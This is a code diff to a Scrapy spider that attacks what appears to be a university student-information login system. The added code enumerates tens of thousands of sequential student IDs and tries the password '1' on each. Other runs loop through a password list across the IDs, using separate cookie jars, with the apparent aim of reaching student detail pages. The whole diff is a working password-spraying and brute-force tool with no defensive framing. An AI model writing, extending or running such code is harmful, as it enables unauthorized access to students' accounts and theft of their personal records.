@@ -17,15 +17,27 @@ class StudentsInfoSpider(scrapy.Spider):
     user_detail_url = 'xjInfoAction.do?oper=xjxx'
     user_info_url = 'userInfo.jsp'
     LOGIN_STATUS = Enum('LOGIN_STATUS', 'SUCCESS WRONG_ID WRONG_PASS')
+    FIRST_TIME_RUNNING = True
 
     def start_requests(self):
-        for password in self.load_passwords():
-            for sid in self.get_sids():
+        if self.FIRST_TIME_RUNNING:
+            self.FIRST_TIME_RUNNING = False
+            for sid in (list(range(2014020000, 2014040000)) +
+                            list(range(2015020000, 2015040000)) +
+                            list(range(2016020000, 2016040000))):
                 yield scrapy.FormRequest(self.domain + self.login_url,
-                                         formdata={'zjh': str(sid), 'mm': password},
+                                         formdata={'zjh': str(sid), 'mm': '1'},
                                          callback=self.parse,
-                                         meta={'sid': sid, 'password': password, 'cookiejar': sid},
+                                         meta={'sid': sid, 'password': '1', 'cookiejar': sid},
                                          dont_filter=True)
+        else:
+            for password in self.load_passwords():
+                for sid in self.get_sids():
+                    yield scrapy.FormRequest(self.domain + self.login_url,
+                                             formdata={'zjh': str(sid), 'mm': password},
+                                             callback=self.parse,
+                                             meta={'sid': sid, 'password': password, 'cookiejar': sid},
+                                             dont_filter=True)
 
     def parse(self, response):
         login_status = self._check_login_status(response)
